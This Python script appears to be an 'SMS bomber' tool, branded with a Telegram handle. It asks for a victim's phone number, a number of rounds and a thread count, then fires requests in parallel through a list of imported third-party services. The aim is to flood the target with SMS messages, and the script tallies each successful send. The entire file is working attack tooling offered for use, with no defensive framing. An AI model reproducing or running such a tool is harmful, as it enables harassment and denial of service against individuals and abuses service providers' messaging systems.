from requests import post, get
from user_agent import generate_user_agent
from colorama import Fore, init
from os import system, name
from concurrent.futures import ThreadPoolExecutor
from time import sleep, time
from datetime import timedelta
import sys
from pystyle import Colors, Colorate, Center
from api import SERVICES

init()

g = Fore.GREEN
w = Fore.WHITE
r = Fore.RED
y = Fore.YELLOW
b = Fore.LIGHTBLACK_EX
re = Fore.RESET

class Counter:
    def __init__(self):
        self.value = 0
        self.start_time = time()
        self.rounds = 0

    def increment(self):
        self.value += 1
        
    def increment_round(self):
        self.rounds += 1
        
    def get_elapsed_time(self):
        return timedelta(seconds=int(time() - self.start_time))

def show_banner():
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter("""

 ▗▄▄▖▗▖  ▗▖ ▗▄▄▖    ▗▄▄▖  ▗▄▖ ▗▖  ▗▖▗▄▄▖ ▗▄▄▄▖▗▄▄▖ 
▐▌   ▐▛▚▞▜▌▐▌       ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌▐▌   ▐▌ ▐▌
 ▝▀▚▖▐▌  ▐▌ ▝▀▚▖    ▐▛▀▚▖▐▌ ▐▌▐▌  ▐▌▐▛▀▚▖▐▛▀▀▘▐▛▀▚▖
▗▄▄▞▘▐▌  ▐▌▗▄▄▞▘    ▐▙▄▞▘▝▚▄▞▘▐▌  ▐▌▐▙▄▞▘▐▙▄▄▖▐▌ ▐▌
                                                           
                  t.me/secabuser
""")))

def clear_screen():
    system('cls' if name == 'nt' else 'clear')

def show_results(counter, phone, total_services):
    clear_screen()
    show_banner()
    
    results_box = f"""
╔{'═'*37}╗
║{'   RESULTS'.center(33)}    ║
╠{'═'*37}╣
║ Target > {phone.ljust(27)}║
║ Services > {str(total_services).ljust(25)}║
║ Successful > {str(counter.value).ljust(23)}║
║ Rounds > {str(counter.rounds).ljust(25)}  ║
║ Time > {str(counter.get_elapsed_time()).ljust(27)}  ║
╚{'═'*37}╝
"""
    
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(results_box)))

def send_request(service_name, number, counter, proxies=None):
    try:

        api_func = SERVICES.get(service_name)
        if not api_func:
            print(f"{r}{service_name.ljust(15)} Service not found!{re}")
            return
            
        response = api_func(number, proxies)
        if response.status_code == 200:
            print(f"{g}{service_name.ljust(15)} Sent!{re}")
            counter.increment()
        else:
            print(f"{r}{service_name.ljust(15)} NotSent! (Status: {response.status_code}){re}")
    except Exception as e:
        print(f"{r}{service_name.ljust(15)} Error: {str(e)}{re}")

def main():
    clear_screen()
    show_banner()
    
    try:
        phone = input(f'{w}Phone > {re}').strip()
        if not phone.isdigit() or len(phone) != 10:
            print(f"{r}Invalid phone number!{re}")
            sys.exit()
        
        rounds = int(input(f'{w}Round > {re}') or 1)
        if rounds < 1:
            print(f"{r}Rounds must be 1 or more!{re}")
            sys.exit()
        
        max_threads = int(input(f'{w}Thread > {re}') or 5)
        time_sleep = float(input(f'{w}Sleep > {re}') or 1)
        
        clear_screen()
        show_banner()
        
        services = list(SERVICES.keys())
        if not services:
            print(f"{r}No services available!{re}")
            sys.exit()
        
        counter = Counter()
        total_services = len(services)
        
        print(f"\n{w}Starting .. \n")
        print(f"{w}Services available > {len(services)}{re}\n")
        
        for current_round in range(1, rounds + 1):
            print(f"{w}Round {current_round}/{rounds}")
            counter.increment_round()
            
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                executor.map(lambda service: send_request(service, phone, counter), services)
            
            if current_round < rounds:
                sleep(time_sleep)
        
        show_results(counter, phone, total_services)
    
    except KeyboardInterrupt:
        print(f"\n{r}Op cancelled !{re}")
    except Exception as e:
        print(f"\n{r}Error > {e}{re}")

if __name__ == "__main__":
    main()